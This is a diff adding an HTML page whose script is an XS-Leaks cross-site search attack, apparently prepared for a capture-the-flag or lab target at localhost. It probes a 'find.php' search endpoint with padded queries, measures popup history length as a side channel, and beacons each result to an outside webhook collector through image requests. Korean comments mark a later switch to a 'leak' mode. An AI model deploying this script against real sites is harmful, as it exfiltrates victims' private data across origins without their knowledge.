@@ -1,0 +1,35 @@
+<!doctype html><meta charset="utf-8">
+<script>
+const TARGET    = "http://localhost";
+const COLLECTOR = "https://webhooksite.net/674fdaef-b325-4a34-8c2f-244a8c43aab4";
+const MODE      = "calib";   // 신호 확인 후 "leak" 로 변경
+
+function log(tag, data){
+  new Image().src = COLLECTOR + "/" + tag + "?d=" + encodeURIComponent(JSON.stringify(data)) + "&t=" + Date.now();
+}
+function furl(prefix, pad){
+  return `${TARGET}/find.php?search=${encodeURIComponent(prefix)}&w=${"A".repeat(pad)}&h=`;
+}
+function probe(url, settle=1200){
+  return new Promise(res=>{
+    const w = window.open("about:blank","p","width=200,height=200");
+    setTimeout(()=>{ try{ w.location = url; }catch(e){} }, 50);
+    setTimeout(()=>{
+      let len=-1; try{ len = w.history.length; }catch(e){ len = "ERR:"+e.name; }
+      try{ w.location = "about:blank"; }catch(e){}
+      setTimeout(()=>{ try{ w.close(); }catch(e){} }, 200);
+      res(len);
+    }, settle);
+  });
+}
+async function calibrate(){
+  log("start", {ua: navigator.userAgent});
+  for(const pad of [0,500,1000,1400,1700,1850,1900,1950,2000,2100]){
+    const len = await probe(furl("zzz_no_match", pad));   // 항상 no-match → c240
+    log("calib", {pad, len});
+    await new Promise(r=>setTimeout(r,300));
+  }
+  log("calib_done", {});
+}
+calibrate();
+</script>
